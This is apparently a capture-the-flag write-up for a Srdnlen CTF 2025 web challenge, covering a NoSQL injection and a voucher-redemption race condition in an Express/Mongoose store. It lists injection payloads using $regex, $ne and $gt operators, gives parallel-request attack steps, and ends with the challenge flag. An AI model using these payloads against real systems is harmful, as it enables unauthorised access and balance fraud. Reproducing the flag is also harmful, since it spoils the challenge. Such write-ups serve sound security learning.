---
date: 2025-01-19
description: NoSQLi + Race Condiition on vouchers
platform: Srdnlen CTF 2025
categories: Web
tags:
  - nosqli
  - race-condition
  - code-review
  - expressJS
  - mongoose
  - mongoDB
duration:
---
# Focus. Speed. I am speed.
Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow!

# Vulnerability 
## nosqli 
`routes.js/redeem`
```js
let { discountCode } = req.query;
const discount = await DiscountCodes.findOne({discountCode})
```
payloads 
```
redeem?discountCode[$regex]=.*H.* 
redeem?discountCode[$ne]=a
redeem?discountCode[$gt]=""
```

## Race Condition 
`routes.js /redeem`
> allows multiple gift card to be used before getting invalidated 
```js
        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();
```

> mongoose search injection vulnerability ?
```bash
npm audit
mongoose  <8.9.5
Severity: critical
Mongoose search injection vulnerability - https://github.com/advisories/GHSA-vg7j-7cwx-8wgw
fix available via `npm audit fix --force`
Will install mongoose@8.9.5, which is a breaking change
node_modules/mongoose
```

# Attack
1. Login to the application
2. Send group (parallel) request in repeater for any working payload `/redeem?discountCode[$ne]=a`

![](_attachments/Pasted%20image%2020250119210336.png)

flag: `srdnlen{6peed_1s_My_0nly_Competition}`